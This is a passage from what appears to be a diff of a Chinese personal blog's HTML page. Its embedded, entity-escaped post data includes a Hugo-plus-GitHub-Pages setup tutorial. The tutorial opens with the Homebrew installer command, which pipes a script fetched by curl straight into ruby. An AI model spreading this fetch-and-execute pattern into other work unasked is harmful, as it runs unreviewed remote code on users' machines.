href=\&#34;#%E6%95%88%E6%9E%9C-2\&#34;&gt;效果&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#32-%E5%A4%9A%E8%A1%8C%E4%BB%A3%E7%A0%81\&#34;&gt;3.2 多行代码&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#4%E5%88%97%E8%A1%A8\&#34;&gt;4.列表&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#41-%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8\&#34;&gt;4.1 无序列表&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%AF%AD%E6%B3%95-3\&#34;&gt;语法&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#42-%E6%9C%89%E5%BA%8F%E5%88%97%E8%A1%A8\&#34;&gt;4.2 有序列表&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%AF%AD%E6%B3%95-4\&#34;&gt;语法&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#5-%E8%A1%A8%E6%A0%BC\&#34;&gt;5. 表格&lt;/a&gt;&lt;br&gt;\n*\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%AF%AD%E6%B3%95-5\&#34;&gt;语法&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%95%88%E6%9E%9C-3\&#34;&gt;效果&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#6%E9%93%BE%E6%8E%A5\&#34;&gt;6.链接&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#61-%E5%9B%BE%E7%89%87\&#34;&gt;6.1 图片&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%AF%AD%E6%B3%95%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87\&#34;&gt;语法（本地图片）&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%AF%AD%E6%B3%95%E7%BD%91%E7%BB%9C%E5%9B%BE%E7%89%87\&#34;&gt;语法（网络图片）&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%95%88%E6%9E%9C-4\&#34;&gt;&lt;em&gt;效果&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#62-%E8%B6%85%E9%93%BE%E6%8E%A5\&#34;&gt;6.2 超链接&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%AF%AD%E6%B3%95%E8%A1%8C%E5%86%85%E5%BC%8F%E9%93%BE%E6%8E%A5\&#34;&gt;语法（行内式链接）&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%95%88%E6%9E%9C-5\&#34;&gt;效果&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%AF%AD%E6%B3%95%E5%8F%82%E8%80%83%E5%BC%8F%E9%93%BE%E6%8E%A5\&#34;&gt;语法（参考式链接）&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%95%88%E6%9E%9C-6\&#34;&gt;效果&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%AF%AD%E6%B3%95%E8%87%AA%E5%8A%A8%E9%93%BE%E6%8E%A5\&#34;&gt;语法（自动链接）&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%95%88%E6%9E%9C-7\&#34;&gt;效果&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;h2 id=\&#34;准备\&#34;&gt;准备&lt;/h2&gt;\n&lt;h3 id=\&#34;安装brew\&#34;&gt;安装brew&lt;/h3&gt;\n&lt;blockquote&gt;\n&lt;p&gt;打开终端，执行下面的命令。&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;pre&gt;&lt;code&gt;$ /usr/bin/ruby -e &amp;quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&amp;quot;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;!-- more --&gt;\n&lt;hr&gt;\n&lt;h2 id=\&#34;hugo\&#34;&gt;hugo&lt;/h2&gt;\n&lt;h3 id=\&#34;步骤1安装hugo\&#34;&gt;步骤1:安装hugo&lt;/h3&gt;\n&lt;pre&gt;&lt;code&gt;$ brew install hugo\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h4 id=\&#34;验证安装\&#34;&gt;验证安装&lt;/h4&gt;\n&lt;pre&gt;&lt;code&gt;$ hugo version\n&lt;/code&gt;&lt;/pre&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8c5tw9gqj30vo0kajsf.jpg\&#34; alt=\&#34;image-20200427150228739\&#34; style=\&#34;zoom: 40%;\&#34; /&gt;\n&lt;h3 id=\&#34;步骤2建立新网站\&#34;&gt;步骤2:建立新网站&lt;/h3&gt;\n&lt;blockquote&gt;\n&lt;p&gt;新建网站文件 blog&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;pre&gt;&lt;code&gt;$ hugo new site blog\n&lt;/code&gt;&lt;/pre&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8cev22wuj30vo0kaqbf.jpg\&#34; alt=\&#34;image-20200427151113426\&#34; style=\&#34;zoom:50%;\&#34; /&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8cfsraevj30me046aby.jpg\&#34; alt=\&#34;image-20200427151209200\&#34; style=\&#34;zoom:50%;\&#34; /&gt;\n&lt;h3 id=\&#34;步骤3添加主题\&#34;&gt;步骤3：添加主题&lt;a href=\&#34;https://gohugo.io/getting-started/quick-start/#step-3-add-a-theme\&#34;&gt; &lt;/a&gt;&lt;/h3&gt;\n&lt;blockquote&gt;\n&lt;p&gt;请参阅&lt;a href=\&#34;https://themes.gohugo.io/\&#34;&gt;themes.gohugo.io&lt;/a&gt;以获取要考虑的主题列表。本快速入门使用了精美的&lt;a href=\&#34;https://themes.gohugo.io/gohugo-theme-ananke/\&#34;&gt;Ananke主题&lt;/a&gt;。&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;h4 id=\&#34;例如m10c主题\&#34;&gt;例如：m10c主题&lt;/h4&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8cinn96bj31gb0u0qh8.jpg\&#34; alt=\&#34;image-20200427151453707\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;blockquote&gt;\n&lt;p&gt;将此存储库克隆到&lt;code&gt;themes/&lt;/code&gt;目录中：&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;pre&gt;&lt;code&gt;$ git clone https://github.com/vaga/hugo-theme-m10c.git themes/m10c\n&lt;/code&gt;&lt;/pre&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8cn17ahtj30vo0ka0z2.jpg\&#34; alt=\&#34;image-20200427151905845\&#34; style=\&#34;zoom:50%;\&#34; /&gt;\n&lt;h3 id=\&#34;步骤4添加一些内容\&#34;&gt;步骤4：添加一些内容&lt;/h3&gt;\n&lt;blockquote&gt;\n&lt;p&gt;您可以手动创建内容文件（例如作为&lt;code&gt;content//.&lt;/code&gt;）并在其中提供元数据，但是您可以使用该&lt;code&gt;new&lt;/code&gt;命令为您做一些事情（例如添加一篇 blog1.md文件）：&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;pre&gt;&lt;code&gt;hugo new posts/blog1.md\n&lt;/code&gt;&lt;/pre&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8cqtu3l0j30vo0kawlt.jpg\&#34; alt=\&#34;image-20200427152245539\&#34; style=\&#34;zoom:50%;\&#34; /&gt;\n&lt;blockquote&gt;\n&lt;p&gt;在目录 &lt;code&gt;blog/content/posts&lt;/code&gt;中生成 &lt;code&gt;bolg1.md&lt;/code&gt;文件&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;h4 id=\&#34;编辑bolg1md文件添加第一篇博客\&#34;&gt;编辑&lt;code&gt;bolg1.md&lt;/code&gt;文件，添加第一篇博客&lt;/h4&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8cw3l7ofj30u00xjgse.jpg\&#34; alt=\&#34;image-20200427152748227\&#34; style=\&#34;zoom:50%;\&#34; /&gt;\n&lt;h3 id=\&#34;步骤5启动hugo服务器\&#34;&gt;步骤5：启动Hugo服务器&lt;/h3&gt;\n&lt;blockquote&gt;\n&lt;p&gt;现在，在本地以m10c主题启动Hugo服务器：&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;pre&gt;&lt;code&gt;hugo server -t m10c --buildDrafts\n&lt;/code&gt;&lt;/pre&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8czgrpoqj30vo0ka7cv.jpg\&#34; alt=\&#34;image-20200427153103751\&#34; style=\&#34;zoom:50%;\&#34; /&gt;\n&lt;blockquote&gt;\n&lt;p&gt;浏览器输入网址&lt;/p&gt;\n&lt;p&gt;​      显示成功&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8d0l5anaj31gb0u0wn3.jpg\&#34; alt=\&#34;image-20200427153205341\&#34; style=\&#34;zoom:50%;\&#34; /&gt;\n&lt;h3 id=\&#34;步骤6将网站推上远端githua\&#34;&gt;步骤6：将网站推上远端(githua)&lt;/h3&gt;\n&lt;blockquote&gt;\n&lt;p&gt;根据githua库设置地址&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;hugo --theme=&amp;lt;主题》 --baseUrl=&amp;quot;&amp;lt;库地址&amp;gt;&amp;quot; --buildDrafts&lt;/code&gt;&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge8d7vu6vvj31gb0u07p0.jpg\&#34; alt=\&#34;image-20200427153908190\&#34; style=\&#34;zoom:50%;\&#34; /&gt;\n&lt;pre&gt;&lt;code&gt;hugo --theme=m10c --baseUrl=&amp;quot;https://tjx158589.github.io/&amp;quot; --buildDrafts\n&lt;/code&gt;&lt;/pre&gt;\n&lt;blockquote&gt;\n&lt;p&gt;主目录生成需上传远端文件夹&lt;code&gt;public&lt;/code&gt;&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;blockquote&gt;\n&lt;p&gt;git 上传操作&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;pre&gt;&lt;code&gt;cd public\n\ngit init\n\ngit add .\n\ngit commit -m &amp;quot;我的 hugo 博客第一次提交&amp;quot;\n\ngit remote add origin https://github.com/tjx158589/tjx158589.github.io.git\n\n\ngit push -u origin master\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&#34;步骤7完成打开网站\&#34;&gt;步骤7：完成打开网站&lt;/h3&gt;\n&#34;,&#34;fileName&#34;:&#34;hugogithua-bo-ke-da-jian-md&#34;,&#34;abstract&#34;:&#34;&lt;h2 id=\&#34;准备\&#34;&gt;准备&lt;/h2&gt;\n&lt;h3 id=\&#34;安装brew\&#34;&gt;安装brew&lt;/h3&gt;\n&lt;blockquote&gt;\n&lt;p&gt;打开终端，执行下面的命令。&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;pre&gt;&lt;code&gt;$ /usr/bin/ruby -e &amp;quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&amp;quot;\n&lt;/code&gt;&lt;/pre&gt;\n&#34;,&#34;title&#34;:&#34;hugo+github博客搭建&#34;,&#34;tags&#34;:[],&#34;date&#34;:&#34;2020-04-27 23:41:19&#34;,&#34;dateFormat&#34;:&#34;2020-04-27&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://tjx158589.github.io/post/hugogithua-bo-ke-da-jian-md/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;2 min read&#34;,&#34;time&#34;:97000,&#34;words&#34;:376,&#34;minutes&#34;:2},&#34;description&#34;:&#34;准备\n安装brew\n\n打开终端，执行下面的命令。\n\n$ /usr/bin/ruby -e &amp;quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/maste...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%87%86%E5%A4%87\&#34;&gt;准备&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%AE%89%E8%A3%85brew\&#34;&gt;安装brew&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#hugo\&#34;&gt;hugo&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%AD%A5%E9%AA%A41%E5%AE%89%E8%A3%85hugo\&#34;&gt;步骤1:安装hugo&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E9%AA%8C%E8%AF%81%E5%AE%89%E8%A3%85\&#34;&gt;验证安装&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%AD%A5%E9%AA%A42%E5%BB%BA%E7%AB%8B%E6%96%B0%E7%BD%91%E7%AB%99\&#34;&gt;步骤2:建立新网站&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%AD%A5%E9%AA%A43%E6%B7%BB%E5%8A%A0%E4%B8%BB%E9%A2%98\&#34;&gt;步骤3：添加主题 &lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%BE%8B%E5%A6%82m10c%E4%B8%BB%E9%A2%98\&#34;&gt;例如：m10c主题&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%AD%A5%E9%AA%A44%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%BA%9B%E5%86%85%E5%AE%B9\&#34;&gt;步骤4：添加一些内容&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%BC%96%E8%BE%91bolg1md%E6%96%87%E4%BB%B6%E6%B7%BB%E5%8A%A0%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2\&#34;&gt;编辑&lt;code&gt;bolg1.md&lt;/code&gt;文件，添加第一篇博客&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%AD%A5%E9%AA%A45%E5%90%AF%E5%8A%A8hugo%E6%9C%8D%E5%8A%A1%E5%99%A8\&#34;&gt;步骤5：启动Hugo服务器&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%AD%A5%E9%AA%A46%E5%B0%86%E7%BD%91%E7%AB%99%E6%8E%A8%E4%B8%8A%E8%BF%9C%E7%AB%AFgithua\&#34;&gt;步骤6：将网站推上远端(githua)&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%AD%A5%E9%AA%A47%E5%AE%8C%E6%88%90%E6%89%93%E5%BC%80%E7%BD%91%E7%AB%99\&#34;&gt;步骤7：完成打开网站&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;blockquote&gt;\n&lt;p&gt;欢迎来到我的小站呀，很高兴遇见你！🤝&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;h2 id=\&#34;关于本站\&#34;&gt;🏠 关于本站&lt;/h2&gt;\n&lt;h2 id=\&#34;博主是谁\&#34;&gt;👨‍💻 博主是谁&lt;/h2&gt;\n&lt;h2 id=\&#34;兴趣爱好\&#34;&gt;⛹ 兴趣爱好&lt;/h2&gt;\n&lt;h2 id=\&#34;联系我呀\&#34;&gt;📬 联系我呀&lt;/h2&gt;\n&#34;,&#34;fileName&#34;:&#34;about&#34;,&#34;abstract&#34;:&#34;&#34;,&#34;title&#34;:&#34;关于&#34;,&#34;tags&#34;:[],&#34;date&#34;:&#34;2019-01-25 19:09:48&#34;,&#34;dateFormat&#34;:&#34;2019-01-25&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://tjx158589.github.io/post/about/&#34;,&#34;hideInList&#34;:true,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:6000,&#34;words&#34;:31,&#34;minutes&#34;:1},&#34;description&#34;:&#34;\n欢迎来到我的小站呀，很高兴遇见你！🤝\n\n🏠 关于本站\n👨‍💻 博主是谁\n⛹ 兴趣爱好\n📬 联系我呀\n...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%85%B3%E4%BA%8E%E6%9C%AC%E7%AB%99\&#34;&gt;🏠 关于本站&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%8D%9A%E4%B8%BB%E6%98%AF%E8%B0%81\&#34;&gt;👨‍💻 博主是谁&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD\&#34;&gt;⛹ 兴趣爱好&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%81%94%E7%B3%BB%E6%88%91%E5%91%80\&#34;&gt;📬 联系我呀&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;}]";
+  // var json = escape.substr(1, escape.length - 2);
+  // var datas = json.split(',');
+  // for (let i=0; i < datas.length; i++) {
+  //   let item = datas[i];
+  //   let attrs = item.split('34;:&#34')
+  //   debugger
+  //   console.log(datas[i])
+  // }
+  let escapeMap = new Map();
+  escapeMap.set('&#34;', '"');
+  escapeMap.set('&gt;', '>');
+  escapeMap.set('&#39;', "'");
+  escapeMap.set('&lt;', '<');
+  escapeMap.set('&quot;', '"');
+  escapeMap.set('&amp;', '&');
+</script> -->
+
+<script src="/media/js/mouse/love.js"></script>
+
+
+<script src=" /media/js/cool.js"></script>
+
+</html>
